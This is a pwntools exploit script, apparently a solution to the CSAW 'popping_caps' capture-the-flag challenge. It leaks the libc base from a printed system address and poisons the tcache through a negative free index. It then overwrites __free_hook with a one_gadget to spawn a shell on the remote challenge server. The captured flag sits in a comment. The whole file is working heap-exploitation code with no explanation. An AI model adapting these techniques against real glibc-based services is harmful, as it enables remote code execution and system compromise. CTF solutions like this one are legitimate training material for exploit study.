from pwn import *

prog_name = './popping_caps'
context.binary = prog_name
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("pwn.chal.csaw.io",1008)
  libcz = ELF("libc.so.6")
  online=True
elif(debug == 1):
  r = process(prog_name, aslr=False, env={'LD_LIBRARY_PATH':'.'})
  libcz = ELF("libc.so.6")

def halt():
  while True:
    log.info( r.recvline() )

def malloc(sizes):
  r.recvuntil("Your choice:")
  r.sendline('1')
  r.recvuntil("How many:")
  r.sendline(str(sizes))

def free(index):
  r.recvuntil("Your choice:")
  r.sendline('2')
  r.recvuntil("hats in a free:")
  r.sendline(str(index))

def write(data):
  r.recvuntil("Your choice:")
  r.sendline('3')
  r.recvuntil("Read me in:")
  r.send(data)

def exploit():
  r.recvuntil("Here is system ")
  system_free=int(r.recvline(),16)
  log.info("System addr :0x{0:x}".format(system_free))
  libc_addr = system_free - 0x4f440
  log.info("Libc addr :0x{0:x}".format( libc_addr))
  free_hook = libc_addr + libcz.symbols['__free_hook']
  log.info("__free_hook addr :0x{0:x}".format( free_hook))
  one_gadget = libc_addr + 0x4f322

  if not   online:
    gdb.attach(r, '''
     set follow-fork-mode child
     b *(0x555555554000 + 0xb82)
     c
     ''')

  # 7 step exploit here:
  malloc(0x20) #7
  free( -0x260 + 0x10 ) #6
  malloc(0x250 - 0x8) #5
  write( "/bin/sh" + "\x00"*(0xc0-0x7) + p64(free_hook)) #4
  malloc(0x120 - 0x8) #3
  write(p64( one_gadget)) #2
  free( -0x260 + 0x10 ) #1
  # flag{don_t_you_wish_your_libc_was_non_vtabled_like_mine_29}
  r.interactive()
  r.close()
  return

 
exploit()
